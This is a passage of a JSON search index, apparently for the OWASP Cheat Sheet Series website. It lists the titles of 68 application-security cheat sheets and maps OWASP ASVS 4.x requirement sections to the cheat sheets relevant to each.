{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"The OWASP Cheat Sheet Series was created to provide a concise collection of high value information on specific application security topics. These cheat sheets were created by various application security professionals who have expertise in specific topics. We hope that this project provides you with excellent security guidance in an easy to read format. You can download this site here . An ATOM feed is available here with the latest updates. Project leaders: Jim Manico Jakub Ma\u0107kowski Project links: Homepage GitHub repository How to contribute? Logo","title":"Introduction"},{"location":"Glossary.html","text":"Index Alphabetical \u00b6 68 cheat sheets available. Icons beside the cheat sheet name indicate in which language(s) code snippet(s) are provided. A B C D E F G H I J K L M N O P Q R S T U V W X A \u00b6 AJAX Security Cheat Sheet . Authentication Cheat Sheet . Access Control Cheat Sheet . Authorization Testing Automation Cheat Sheet . Attack Surface Analysis Cheat Sheet . Abuse Case Cheat Sheet . B \u00b6 Bean Validation Cheat Sheet . C \u00b6 Cryptographic Storage Cheat Sheet . Choosing and Using Security Questions Cheat Sheet . C-Based Toolchain Hardening Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet . Credential Stuffing Prevention Cheat Sheet . Cross Site Scripting Prevention Cheat Sheet . Content Security Policy Cheat Sheet . Clickjacking Defense Cheat Sheet . D \u00b6 Deserialization Cheat Sheet . Docker Security Cheat Sheet . Database Security Cheat Sheet . DotNet Security Cheat Sheet . Denial of Service Cheat Sheet . DOM based XSS Prevention Cheat Sheet . E \u00b6 Error Handling Cheat Sheet . F \u00b6 File Upload Cheat Sheet . Forgot Password Cheat Sheet . G \u00b6 GraphQL Cheat Sheet . H \u00b6 HTTP Strict Transport Security Cheat Sheet . HTML5 Security Cheat Sheet . I \u00b6 Injection Prevention in Java Cheat Sheet . Input Validation Cheat Sheet . Insecure Direct Object Reference Prevention Cheat Sheet . Injection Prevention Cheat Sheet . J \u00b6 JSON Web Token for Java Cheat Sheet . JAAS Cheat Sheet . K \u00b6 Key Management Cheat Sheet . Kubernetes Security Cheat Sheet . L \u00b6 LDAP Injection Prevention Cheat Sheet . Logging Cheat Sheet . M \u00b6 Microservices security . Mass Assignment Cheat Sheet . Microservices based Security Arch Doc Cheat Sheet . Multifactor Authentication Cheat Sheet . N \u00b6 Nodejs Security Cheat Sheet . O \u00b6 OS Command Injection Defense Cheat Sheet . P \u00b6 Pinning Cheat Sheet . Password Storage Cheat Sheet . PHP Configuration Cheat Sheet . Q \u00b6 Query Parameterization Cheat Sheet . R \u00b6 REST Assessment Cheat Sheet . REST Security Cheat Sheet . Ruby on Rails Cheat Sheet . S \u00b6 Securing Cascading Style Sheets Cheat Sheet . Server Side Request Forgery Prevention Cheat Sheet . SAML Security Cheat Sheet . SQL Injection Prevention Cheat Sheet . Session Management Cheat Sheet . T \u00b6 Transport Layer Protection Cheat Sheet . Threat Modeling Cheat Sheet . Third Party Javascript Management Cheat Sheet . TLS Cipher String Cheat Sheet . Transaction Authorization Cheat Sheet . U \u00b6 User Privacy Protection Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet . V \u00b6 Vulnerability Disclosure Cheat Sheet . Vulnerable Dependency Management Cheat Sheet . Virtual Patching Cheat Sheet . W \u00b6 Web Service Security Cheat Sheet . X \u00b6 XML Security Cheat Sheet . XML External Entity Prevention Cheat Sheet .","title":"Index Alphabetical"},{"location":"Glossary.html#index-alphabetical","text":"68 cheat sheets available. Icons beside the cheat sheet name indicate in which language(s) code snippet(s) are provided. A B C D E F G H I J K L M N O P Q R S T U V W X","title":"Index Alphabetical"},{"location":"Glossary.html#a","text":"AJAX Security Cheat Sheet . Authentication Cheat Sheet . Access Control Cheat Sheet . Authorization Testing Automation Cheat Sheet . Attack Surface Analysis Cheat Sheet . Abuse Case Cheat Sheet .","title":"A"},{"location":"Glossary.html#b","text":"Bean Validation Cheat Sheet .","title":"B"},{"location":"Glossary.html#c","text":"Cryptographic Storage Cheat Sheet . Choosing and Using Security Questions Cheat Sheet . C-Based Toolchain Hardening Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet . Credential Stuffing Prevention Cheat Sheet . Cross Site Scripting Prevention Cheat Sheet . Content Security Policy Cheat Sheet . Clickjacking Defense Cheat Sheet .","title":"C"},{"location":"Glossary.html#d","text":"Deserialization Cheat Sheet . Docker Security Cheat Sheet . Database Security Cheat Sheet . DotNet Security Cheat Sheet . Denial of Service Cheat Sheet . DOM based XSS Prevention Cheat Sheet .","title":"D"},{"location":"Glossary.html#e","text":"Error Handling Cheat Sheet .","title":"E"},{"location":"Glossary.html#f","text":"File Upload Cheat Sheet . Forgot Password Cheat Sheet .","title":"F"},{"location":"Glossary.html#g","text":"GraphQL Cheat Sheet .","title":"G"},{"location":"Glossary.html#h","text":"HTTP Strict Transport Security Cheat Sheet . HTML5 Security Cheat Sheet .","title":"H"},{"location":"Glossary.html#i","text":"Injection Prevention in Java Cheat Sheet . Input Validation Cheat Sheet . Insecure Direct Object Reference Prevention Cheat Sheet . Injection Prevention Cheat Sheet .","title":"I"},{"location":"Glossary.html#j","text":"JSON Web Token for Java Cheat Sheet . JAAS Cheat Sheet .","title":"J"},{"location":"Glossary.html#k","text":"Key Management Cheat Sheet . Kubernetes Security Cheat Sheet .","title":"K"},{"location":"Glossary.html#l","text":"LDAP Injection Prevention Cheat Sheet . Logging Cheat Sheet .","title":"L"},{"location":"Glossary.html#m","text":"Microservices security . Mass Assignment Cheat Sheet . Microservices based Security Arch Doc Cheat Sheet . Multifactor Authentication Cheat Sheet .","title":"M"},{"location":"Glossary.html#n","text":"Nodejs Security Cheat Sheet .","title":"N"},{"location":"Glossary.html#o","text":"OS Command Injection Defense Cheat Sheet .","title":"O"},{"location":"Glossary.html#p","text":"Pinning Cheat Sheet . Password Storage Cheat Sheet . PHP Configuration Cheat Sheet .","title":"P"},{"location":"Glossary.html#q","text":"Query Parameterization Cheat Sheet .","title":"Q"},{"location":"Glossary.html#r","text":"REST Assessment Cheat Sheet . REST Security Cheat Sheet . Ruby on Rails Cheat Sheet .","title":"R"},{"location":"Glossary.html#s","text":"Securing Cascading Style Sheets Cheat Sheet . Server Side Request Forgery Prevention Cheat Sheet . SAML Security Cheat Sheet . SQL Injection Prevention Cheat Sheet . Session Management Cheat Sheet .","title":"S"},{"location":"Glossary.html#t","text":"Transport Layer Protection Cheat Sheet . Threat Modeling Cheat Sheet . Third Party Javascript Management Cheat Sheet . TLS Cipher String Cheat Sheet . Transaction Authorization Cheat Sheet .","title":"T"},{"location":"Glossary.html#u","text":"User Privacy Protection Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet .","title":"U"},{"location":"Glossary.html#v","text":"Vulnerability Disclosure Cheat Sheet . Vulnerable Dependency Management Cheat Sheet . Virtual Patching Cheat Sheet .","title":"V"},{"location":"Glossary.html#w","text":"Web Service Security Cheat Sheet .","title":"W"},{"location":"Glossary.html#x","text":"XML Security Cheat Sheet . XML External Entity Prevention Cheat Sheet .","title":"X"},{"location":"IndexASVS.html","text":"ASVS Index \u00b6 Table of Contents \u00b6 Objective V1: Architecture, Design and Threat Modeling Requirements V1.1 Secure Software Development Lifecycle Requirements V1.2 Authentication Architectural Requirements V1.3 Session Management Architectural Requirements V1.4 Access Control Architectural Requirements V1.5 Input and Output Architectural Requirements V1.6 Cryptographic Architectural Requirements V1.7 Errors, Logging and Auditing Architectural Requirements V1.8 Data Protection and Privacy Architectural Requirements V1.9 Communications Architectural Requirements V1.10 Malicious Software Architectural Requirements V1.11 Business Logic Architectural Requirements V1.12 Secure File Upload Architectural Requirements V1.13 API Architectural Requirements V1.14 Configuration Architectural Requirements V2: Authentication Verification Requirements V2.1 Password Security Requirements V2.2 General Authenticator Requirements V2.3 Authenticator Lifecycle Requirements V2.4 Credential Storage Requirements V2.5 Credential Recovery Requirements V2.6 Look-up Secret Verifier Requirements V2.7 Out of Band Verifier Requirements V2.8 Single or Multi Factor One Time Verifier Requirements V2.9 Cryptographic Software and Devices Verifier Requirements V2.10 Service Authentication Requirements V3: Session Management Verification Requirements V3.1 Fundamental Session Management Requirements V3.2 Session Binding Requirements V3.3 Session Logout and Timeout Requirements V3.4 Cookie-based Session Management V3.5 Token-based Session Management V3.6 Re-authentication from a Federation or Assertion V3.7 Defenses Against Session Management Exploits V4: Access Control Verification Requirements V4.1 General Access Control Design V4.2 Operation Level Access Control V4.3 Other Access Control Considerations V5: Validation, Sanitization and Encoding Verification Requirements V5.1 Input Validation Requirements V5.2 Sanitization and Sandboxing Requirements V5.3 Output encoding and Injection Prevention Requirements V5.4 Memory, String, and Unmanaged Code Requirements V5.5 Deserialization Prevention Requirements V6: Stored Cryptography Verification Requirements V6.1 Data Classification V6.2 Algorithms V6.3 Random Values V6.4 Secret Management V7: Error Handling and Logging Verification Requirements V7.1 Log Content Requirements V7.2 Log Processing Requirements V7.3 Log Protection Requirements V7.4 Error Handling V8: Data Protection Verification Requirements V8.1 General Data Protection V8.2 Client-side Data Protection V8.3 Sensitive Private Data V9: Communications Verification Requirements V9.1 Communications Security Requirements V9.2 Server Communications Security Requirements V10: Malicious Code Verification Requirements V10.1 Code Integrity Controls V10.2 Malicious Code Search V10.3 Deployed Application Integrity Controls V11: Business Logic Verification Requirements V11.1 Business Logic Security Requirements V12: File and Resources Verification Requirements V12.1 File Upload Requirements V12.2 File Integrity Requirements V12.3 File execution Requirements V12.4 File Storage Requirements V12.5 File Download Requirements V12.6 SSRF Protection Requirements V13: API and Web Service Verification Requirements V13.1 Generic Web Service Security Verification Requirements V13.2 RESTful Web Service Verification Requirements V13.3 SOAP Web Service Verification Requirements V13.4 GraphQL and other Web Service Data Layer Security Requirements V14: Configuration Verification Requirements V14.1 Build V14.2 Dependency V14.3 Unintended Security Disclosure Requirements V14.4 HTTP Security Headers Requirements V14.5 Validate HTTP Request Header Requirements Objective \u00b6 The objective of this index is to help an OWASP Application Security Verification Standard (ASVS) user clearly identify which cheat sheets are useful for each section during his or her usage of the ASVS. This index is based on the version 4.x of the ASVS. V1: Architecture, Design and Threat Modeling Requirements \u00b6 V1.1 Secure Software Development Lifecycle Requirements \u00b6 Threat Modeling Cheat Sheet . Abuse Case Cheat Sheet . Attack Surface Analysis Cheat Sheet . V1.2 Authentication Architectural Requirements \u00b6 None. V1.3 Session Management Architectural Requirements \u00b6 None. V1.4 Access Control Architectural Requirements \u00b6 Docker Security Cheat Sheet . V1.5 Input and Output Architectural Requirements \u00b6 Abuse Case Cheat Sheet . Deserialization Cheat Sheet . V1.6 Cryptographic Architectural Requirements \u00b6 Cryptographic Storage Cheat Sheet . Key Management Cheat Sheet . V1.7 Errors, Logging and Auditing Architectural Requirements \u00b6 Logging Cheat Sheet . V1.8 Data Protection and Privacy Architectural Requirements \u00b6 Abuse Case Cheat Sheet . User Privacy Protection Cheat Sheet . V1.9 Communications Architectural Requirements \u00b6 Transport Layer Protection Cheat Sheet . TLS Cipher String Cheat Sheet . V1.10 Malicious Software Architectural Requirements \u00b6 Third Party Javascript Management Cheat Sheet . Virtual Patching Cheat Sheet . V1.11 Business Logic Architectural Requirements \u00b6 Abuse Case Cheat Sheet . V1.12 Secure File Upload Architectural Requirements \u00b6 None. V1.13 API Architectural Requirements \u00b6 REST Security Cheat Sheet . V1.14 Configuration Architectural Requirements \u00b6 None. V2: Authentication Verification Requirements \u00b6 V2.1 Password Security Requirements \u00b6 Choosing and Using Security Questions Cheat Sheet . Forgot Password Cheat Sheet . Credential Stuffing Prevention Cheat Sheet V2.2 General Authenticator Requirements \u00b6 Authentication Cheat Sheet . Transport Layer Protection Cheat Sheet . TLS Cipher String Cheat Sheet . V2.3 Authenticator Lifecycle Requirements \u00b6 None. V2.4 Credential Storage Requirements \u00b6 Password Storage Cheat Sheet . V2.5 Credential Recovery Requirements \u00b6 Choosing and Using Security Questions Cheat Sheet . Forgot Password Cheat Sheet . V2.6 Look-up Secret Verifier Requirements \u00b6 None. V2.7 Out of Band Verifier Requirements \u00b6 Forgot Password Cheat Sheet . V2.8 Single or Multi Factor One Time Verifier Requirements \u00b6 None. V2.9 Cryptographic Software and Devices Verifier Requirements \u00b6 Cryptographic Storage Cheat Sheet . Key Management Cheat Sheet . V2.10 Service Authentication Requirements \u00b6 None. V3: Session Management Verification Requirements \u00b6 V3.1 Fundamental Session Management Requirements \u00b6 None. V3.2 Session Binding Requirements \u00b6 Session Management Cheat Sheet . V3.3 Session Logout and Timeout Requirements \u00b6 Session Management Cheat Sheet . V3.4 Cookie-based Session Management \u00b6 Session Management Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet . V3.5 Token-based Session Management \u00b6 JSON Web Token Cheat Sheet for Java . REST Security Cheat Sheet . V3.6 Re-authentication from a Federation or Assertion \u00b6 None. V3.7 Defenses Against Session Management Exploits \u00b6 Session Management Cheat Sheet . Transaction Authorization Cheat Sheet . V4: Access Control Verification Requirements \u00b6 V4.1 General Access Control Design \u00b6 Access Control Cheat Sheet . Authorization Testing Automation . V4.2 Operation Level Access Control \u00b6 Insecure Direct Object Reference Prevention Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet . Authorization Testing Automation . V4.3 Other Access Control Considerations \u00b6 REST Assessment Cheat Sheet . V5: Validation, Sanitization and Encoding Verification Requirements \u00b6 V5.1 Input Validation Requirements \u00b6 Mass Assignment Cheat Sheet . Input Validation Cheat Sheet . V5.2 Sanitization and Sandboxing Requirements \u00b6 Server Side Request Forgery Prevention Cheat Sheet . XSS Prevention Cheat Sheet . DOM based XSS Prevention Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet . V5.3 Output encoding and Injection Prevention Requirements \u00b6 XSS Prevention Cheat Sheet . DOM based XSS Prevention Cheat Sheet . HTML5 Security Cheat Sheet . Injection Prevention Cheat Sheet . Injection Prevention Cheat Sheet in Java . Input Validation Cheat Sheet . LDAP Injection Prevention Cheat Sheet . OS Command Injection Defense Cheat Sheet . Protect File Upload Against Malicious File . Query Parameterization Cheat Sheet . SQL Injection Prevention Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet . Bean Validation Cheat Sheet . XXE Prevention Cheat Sheet . XML Security Cheat Sheet . V5.4 Memory, String, and Unmanaged Code Requirements \u00b6 None. V5.5 Deserialization Prevention Requirements \u00b6 Deserialization Cheat Sheet . XXE Prevention Cheat Sheet . XML Security Cheat Sheet . V6: Stored Cryptography Verification Requirements \u00b6 V6.1 Data Classification \u00b6 Abuse Case Cheat Sheet . User Privacy Protection Cheat Sheet . V6.2 Algorithms \u00b6 Cryptographic Storage Cheat Sheet . Key Management Cheat Sheet . V6.3 Random Values \u00b6 None. V6.4 Secret Management \u00b6 Key Management Cheat Sheet . V7: Error Handling and Logging Verification Requirements \u00b6 V7.1 Log Content Requirements \u00b6 Logging Cheat Sheet . V7.2 Log Processing Requirements \u00b6 Logging Cheat Sheet . V7.3 Log Protection Requirements \u00b6 Logging Cheat Sheet . V7.4 Error Handling \u00b6 Error Handling Cheat Sheet . V8: Data Protection Verification Requirements \u00b6 V8.1 General Data Protection \u00b6 None. V8.2 Client-side Data Protection \u00b6 None. V8.3 Sensitive Private Data \u00b6 None. V9: Communications Verification Requirements \u00b6 V9.1 Communications Security Requirements \u00b6 HTTP Strict Transport Security Cheat Sheet . Transport Layer Protection Cheat Sheet . TLS Cipher String Cheat Sheet . V9.2 Server Communications Security Requirements \u00b6 None. V10: Malicious Code Verification Requirements \u00b6 V10.1 Code Integrity Controls \u00b6 Third Party Javascript Management Cheat Sheet . V10.2 Malicious Code Search \u00b6 None. V10.3 Deployed Application Integrity Controls \u00b6 Docker Security Cheat Sheet . V11: Business Logic Verification Requirements \u00b6 V11.1 Business Logic Security Requirements \u00b6 Abuse Case Cheat Sheet . V12: File and Resources Verification Requirements \u00b6 V12.1 File Upload Requirements \u00b6 Protect File Upload Against Malicious File . V12.2 File Integrity Requirements \u00b6 Protect File Upload Against Malicious File . Third Party Javascript Management Cheat Sheet . V12.3 File execution Requirements \u00b6 None. V12.4 File Storage Requirements \u00b6 None. V12.5 File Download Requirements \u00b6 None. V12.6 SSRF Protection Requirements \u00b6 Server Side Request Forgery Prevention Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet . V13: API and Web Service Verification Requirements \u00b6 V13.1 Generic Web Service Security Verification Requirements \u00b6 Web Service Security Cheat Sheet . Server Side Request Forgery Prevention Cheat Sheet . V13.2 RESTful Web Service Verification Requirements \u00b6 REST Assessment Cheat Sheet . REST Security Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet . V13.3 SOAP Web Service Verification Requirements \u00b6 XML Security Cheat Sheet . V13.4 GraphQL and other Web Service Data Layer Security Requirements \u00b6 None. V14: Configuration Verification Requirements \u00b6 V14.1 Build \u00b6 Docker Security Cheat Sheet . V14.2 Dependency \u00b6 Docker Security Cheat Sheet . Vulnerable Dependency Management Cheat Sheet . V14.3 Unintended Security Disclosure Requirements \u00b6 Error Handling Cheat Sheet . V14.4 HTTP Security Headers Requirements \u00b6 Content Security Policy Cheat Sheet . V14.5 Validate HTTP Request Header Requirements \u00b6 None.","title":"Index ASVS"},{"location":"IndexASVS.html#asvs-index","text":"","title":"ASVS Index"},{"location":"IndexASVS.html#table-of-contents","text":"Objective V1: Architecture, Design and Threat Modeling Requirements V1.1 Secure Software Development Lifecycle Requirements V1.2 Authentication Architectural Requirements V1.3 Session Management Architectural Requirements V1.4 Access Control Architectural Requirements V1.5 Input and Output Architectural Requirements V1.6 Cryptographic Architectural Requirements V1.7 Errors, Logging and Auditing Architectural Requirements V1.8 Data Protection and Privacy Architectural Requirements V1.9 Communications Architectural Requirements V1.10 Malicious Software Architectural Requirements V1.11 Business Logic Architectural Requirements V1.12 Secure File Upload Architectural Requirements V1.13 API Architectural Requirements V1.14 Configuration Architectural Requirements V2: Authentication Verification Requirements V2.1 Password Security Requirements V2.2 General Authenticator Requirements V2.3 Authenticator Lifecycle Requirements V2.4 Credential Storage Requirements V2.5 Credential Recovery Requirements V2.6 Look-up Secret Verifier Requirements V2.7 Out of Band Verifier Requirements V2.8 Single or Multi Factor One Time Verifier Requirements V2.9 Cryptographic Software and Devices Verifier Requirements V2.10 Service Authentication Requirements V3: Session Management Verification Requirements V3.1 Fundamental Session Management Requirements V3.2 Session Binding Requirements V3.3 Session Logout and Timeout Requirements V3.4 Cookie-based Session Management V3.5 Token-based Session Management V3.6 Re-authentication from a Federation or Assertion V3.7 Defenses Against Session Management Exploits V4: Access Control Verification Requirements V4.1 General Access Control Design V4.2 Operation Level Access Control V4.3 Other Access Control Considerations V5: Validation, Sanitization and Encoding Verification Requirements V5.1 Input Validation Requirements V5.2 Sanitization and Sandboxing Requirements V5.3 Output encoding and Injection Prevention Requirements V5.4 Memory, String, and Unmanaged Code Requirements V5.5 Deserialization Prevention Requirements V6: Stored Cryptography Verification Requirements V6.1 Data Classification V6.2 Algorithms V6.3 Random Values V6.4 Secret Management V7: Error Handling and Logging Verification Requirements V7.1 Log Content Requirements V7.2 Log Processing Requirements V7.3 Log Protection Requirements V7.4 Error Handling V8: Data Protection Verification Requirements V8.1 General Data Protection V8.2 Client-side Data Protection V8.3 Sensitive Private Data V9: Communications Verification Requirements V9.1 Communications Security Requirements V9.2 Server Communications Security Requirements V10: Malicious Code Verification Requirements V10.1 Code Integrity Controls V10.2 Malicious Code Search V10.3 Deployed Application Integrity Controls V11: Business Logic Verification Requirements V11.1 Business Logic Security Requirements V12: File and Resources Verification Requirements V12.1 File Upload Requirements V12.2 File Integrity Requirements V12.3 File execution Requirements V12.4 File Storage Requirements V12.5 File Download Requirements V12.6 SSRF Protection Requirements V13: API and Web Service Verification Requirements V13.1 Generic Web Service Security Verification Requirements V13.2 RESTful Web Service Verification Requirements V13.3 SOAP Web Service Verification Requirements V13.4 GraphQL and other Web Service Data Layer Security Requirements V14: Configuration Verification Requirements V14.1 Build V14.2 Dependency V14.3 Unintended Security Disclosure Requirements V14.4 HTTP Security Headers Requirements V14.5 Validate HTTP Request Header Requirements","title":"Table of Contents"},{"location":"IndexASVS.html#objective","text":"The objective of this index is to help an OWASP Application Security Verification Standard (ASVS) user clearly identify which cheat sheets are useful for each section during his or her usage of the ASVS. This index is based on the version 4.x of the ASVS.","title":"Objective"},{"location":"IndexASVS.html#v1-architecture-design-and-threat-modeling-requirements","text":"","title":"V1: Architecture, Design and Threat Modeling Requirements"},{"location":"IndexASVS.html#v11-secure-software-development-lifecycle-requirements","text":"Threat Modeling Cheat Sheet . Abuse Case Cheat Sheet . Attack Surface Analysis Cheat Sheet .","title":"V1.1 Secure Software Development Lifecycle Requirements"},{"location":"IndexASVS.html#v12-authentication-architectural-requirements","text":"None.","title":"V1.2 Authentication Architectural Requirements"},{"location":"IndexASVS.html#v13-session-management-architectural-requirements","text":"None.","title":"V1.3 Session Management Architectural Requirements"},{"location":"IndexASVS.html#v14-access-control-architectural-requirements","text":"Docker Security Cheat Sheet .","title":"V1.4 Access Control Architectural Requirements"},{"location":"IndexASVS.html#v15-input-and-output-architectural-requirements","text":"Abuse Case Cheat Sheet . Deserialization Cheat Sheet .","title":"V1.5 Input and Output Architectural Requirements"},{"location":"IndexASVS.html#v16-cryptographic-architectural-requirements","text":"Cryptographic Storage Cheat Sheet . Key Management Cheat Sheet .","title":"V1.6 Cryptographic Architectural Requirements"},{"location":"IndexASVS.html#v17-errors-logging-and-auditing-architectural-requirements","text":"Logging Cheat Sheet .","title":"V1.7 Errors, Logging and Auditing Architectural Requirements"},{"location":"IndexASVS.html#v18-data-protection-and-privacy-architectural-requirements","text":"Abuse Case Cheat Sheet . User Privacy Protection Cheat Sheet .","title":"V1.8 Data Protection and Privacy Architectural Requirements"},{"location":"IndexASVS.html#v19-communications-architectural-requirements","text":"Transport Layer Protection Cheat Sheet . TLS Cipher String Cheat Sheet .","title":"V1.9 Communications Architectural Requirements"},{"location":"IndexASVS.html#v110-malicious-software-architectural-requirements","text":"Third Party Javascript Management Cheat Sheet . Virtual Patching Cheat Sheet .","title":"V1.10 Malicious Software Architectural Requirements"},{"location":"IndexASVS.html#v111-business-logic-architectural-requirements","text":"Abuse Case Cheat Sheet .","title":"V1.11 Business Logic Architectural Requirements"},{"location":"IndexASVS.html#v112-secure-file-upload-architectural-requirements","text":"None.","title":"V1.12 Secure File Upload Architectural Requirements"},{"location":"IndexASVS.html#v113-api-architectural-requirements","text":"REST Security Cheat Sheet .","title":"V1.13 API Architectural Requirements"},{"location":"IndexASVS.html#v114-configuration-architectural-requirements","text":"None.","title":"V1.14 Configuration Architectural Requirements"},{"location":"IndexASVS.html#v2-authentication-verification-requirements","text":"","title":"V2: Authentication Verification Requirements"},{"location":"IndexASVS.html#v21-password-security-requirements","text":"Choosing and Using Security Questions Cheat Sheet . Forgot Password Cheat Sheet . Credential Stuffing Prevention Cheat Sheet","title":"V2.1 Password Security Requirements"},{"location":"IndexASVS.html#v22-general-authenticator-requirements","text":"Authentication Cheat Sheet . Transport Layer Protection Cheat Sheet . TLS Cipher String Cheat Sheet .","title":"V2.2 General Authenticator Requirements"},{"location":"IndexASVS.html#v23-authenticator-lifecycle-requirements","text":"None.","title":"V2.3 Authenticator Lifecycle Requirements"},{"location":"IndexASVS.html#v24-credential-storage-requirements","text":"Password Storage Cheat Sheet .","title":"V2.4 Credential Storage Requirements"},{"location":"IndexASVS.html#v25-credential-recovery-requirements","text":"Choosing and Using Security Questions Cheat Sheet . Forgot Password Cheat Sheet .","title":"V2.5 Credential Recovery Requirements"},{"location":"IndexASVS.html#v26-look-up-secret-verifier-requirements","text":"None.","title":"V2.6 Look-up Secret Verifier Requirements"},{"location":"IndexASVS.html#v27-out-of-band-verifier-requirements","text":"Forgot Password Cheat Sheet .","title":"V2.7 Out of Band Verifier Requirements"},{"location":"IndexASVS.html#v28-single-or-multi-factor-one-time-verifier-requirements","text":"None.","title":"V2.8 Single or Multi Factor One Time Verifier Requirements"},{"location":"IndexASVS.html#v29-cryptographic-software-and-devices-verifier-requirements","text":"Cryptographic Storage Cheat Sheet . Key Management Cheat Sheet .","title":"V2.9 Cryptographic Software and Devices Verifier Requirements"},{"location":"IndexASVS.html#v210-service-authentication-requirements","text":"None.","title":"V2.10 Service Authentication Requirements"},{"location":"IndexASVS.html#v3-session-management-verification-requirements","text":"","title":"V3: Session Management Verification Requirements"},{"location":"IndexASVS.html#v31-fundamental-session-management-requirements","text":"None.","title":"V3.1 Fundamental Session Management Requirements"},{"location":"IndexASVS.html#v32-session-binding-requirements","text":"Session Management Cheat Sheet .","title":"V3.2 Session Binding Requirements"},{"location":"IndexASVS.html#v33-session-logout-and-timeout-requirements","text":"Session Management Cheat Sheet .","title":"V3.3 Session Logout and Timeout Requirements"},{"location":"IndexASVS.html#v34-cookie-based-session-management","text":"Session Management Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet .","title":"V3.4 Cookie-based Session Management"},{"location":"IndexASVS.html#v35-token-based-session-management","text":"JSON Web Token Cheat Sheet for Java . REST Security Cheat Sheet .","title":"V3.5 Token-based Session Management"},{"location":"IndexASVS.html#v36-re-authentication-from-a-federation-or-assertion","text":"None.","title":"V3.6 Re-authentication from a Federation or Assertion"},{"location":"IndexASVS.html#v37-defenses-against-session-management-exploits","text":"Session Management Cheat Sheet . Transaction Authorization Cheat Sheet .","title":"V3.7 Defenses Against Session Management Exploits"},{"location":"IndexASVS.html#v4-access-control-verification-requirements","text":"","title":"V4: Access Control Verification Requirements"},{"location":"IndexASVS.html#v41-general-access-control-design","text":"Access Control Cheat Sheet . Authorization Testing Automation .","title":"V4.1 General Access Control Design"},{"location":"IndexASVS.html#v42-operation-level-access-control","text":"Insecure Direct Object Reference Prevention Cheat Sheet . Cross-Site Request Forgery Prevention Cheat Sheet . Authorization Testing Automation .","title":"V4.2 Operation Level Access Control"},{"location":"IndexASVS.html#v43-other-access-control-considerations","text":"REST Assessment Cheat Sheet .","title":"V4.3 Other Access Control Considerations"},{"location":"IndexASVS.html#v5-validation-sanitization-and-encoding-verification-requirements","text":"","title":"V5: Validation, Sanitization and Encoding Verification Requirements"},{"location":"IndexASVS.html#v51-input-validation-requirements","text":"Mass Assignment Cheat Sheet . Input Validation Cheat Sheet .","title":"V5.1 Input Validation Requirements"},{"location":"IndexASVS.html#v52-sanitization-and-sandboxing-requirements","text":"Server Side Request Forgery Prevention Cheat Sheet . XSS Prevention Cheat Sheet . DOM based XSS Prevention Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet .","title":"V5.2 Sanitization and Sandboxing Requirements"},{"location":"IndexASVS.html#v53-output-encoding-and-injection-prevention-requirements","text":"XSS Prevention Cheat Sheet . DOM based XSS Prevention Cheat Sheet . HTML5 Security Cheat Sheet . Injection Prevention Cheat Sheet . Injection Prevention Cheat Sheet in Java . Input Validation Cheat Sheet . LDAP Injection Prevention Cheat Sheet . OS Command Injection Defense Cheat Sheet . Protect File Upload Against Malicious File . Query Parameterization Cheat Sheet . SQL Injection Prevention Cheat Sheet . Unvalidated Redirects and Forwards Cheat Sheet . Bean Validation Cheat Sheet . XXE Prevention Cheat Sheet . XML Security Cheat Sheet .","title":"V5.3 Output encoding and Injection Prevention Requirements"},{"location":"IndexASVS.html#v54-memory-string-and-unmanaged-code-requirements","text":"None.","title":"V5.4 Memory, String, and Unmanaged Code Requirements"},{"location":"IndexASVS.html#v55-deserialization-prevention-requirements","text":"Deserialization Cheat Sheet . XXE Prevention Cheat Sheet . XML Security Cheat Sheet .","title":"V5.5 Deserialization Prevention Requirements"},{"location":"IndexASVS.html#v6-stored-cryptography-verification-requirements","text":"","title":"V6: Stored Cryptography Verification Requirements"},{"location":"IndexASVS.html#v61-data-classification","text":"Abuse Case Cheat Sheet . User Privacy Protection Cheat Sheet .","title":"V6.1 Data Classification"},{"location":"IndexASVS.html#v62-algorithms","text":"Cryptographic Storage Cheat Sheet . Key Management Cheat Sheet .","title":"V6.2 Algorithms"},{"location":"IndexASVS.html#v63-random-values","text":"None.","title":"V6.3 Random Values"},{"location":"IndexASVS.html#v64-secret-management","text":"Key Management Cheat Sheet .","title":"V6.4 Secret Management"},{"location":"IndexASVS.html#v7-error-handling-and-logging-verification-requirements","text":"","title":"V7: Error Handling and Logging Verification Requirements"},{"location":"IndexASVS.html#v71-log-content-requirements","text":"Logging Cheat Sheet .","title":"V7.1 Log Content Requirements"},{"location":"IndexASVS.html#v72-log-processing-requirements","text":"Logging Cheat Sheet .","title":"V7.2 Log Processing Requirements"},{"location":"IndexASVS.html#v73-log-protection-requirements","text":"Logging Cheat Sheet .","title":"V7.3 Log Protection Requirements"},{"location":"IndexASVS.html#v74-error-handling","text":"Error Handling Cheat Sheet .","title":"V7.4 Error Handling"},{"location":"IndexASVS.html#v8-data-protection-verification-requirements","text":"","title":"V8: Data Protection Verification Requirements"},{"location":"IndexASVS.html#v81-general-data-protection","text":"None.","title":"V8.1 General Data Protection"},{"location":"IndexASVS.html#v82-client-side-data-protection","text":"None.","title":"V8.2 Client-side Data Protection"},{"location":"IndexASVS.html#v83-sensitive-private-data","text":"None.","title":"V8.3 Sensitive Private Data"},{"location":"IndexASVS.html#v9-communications-verification-requirements","text":"","title":"V9: Communications Verification Requirements"},{"location":"IndexASVS.html#v91-communications-security-requirements","text":"HTTP Strict Transport Security Cheat Sheet . Transport Layer Protection Cheat Sheet . TLS Cipher String Cheat Sheet .","title":"V9.1 Communications Security Requirements"},{"location":"IndexASVS.html#v92-server-communications-security-requirements","text":"None.","title":"V9.2 Server Communications Security Requirements"},{"location":"IndexASVS.html#v10-malicious-code-verification-requirements","text":"","title":"V10: Malicious Code Verification Requirements"},{"location":"IndexASVS.html#v101-code-integrity-controls","text":"Third Party Javascript Management Cheat Sheet .","title":"V10.1 Code Integrity 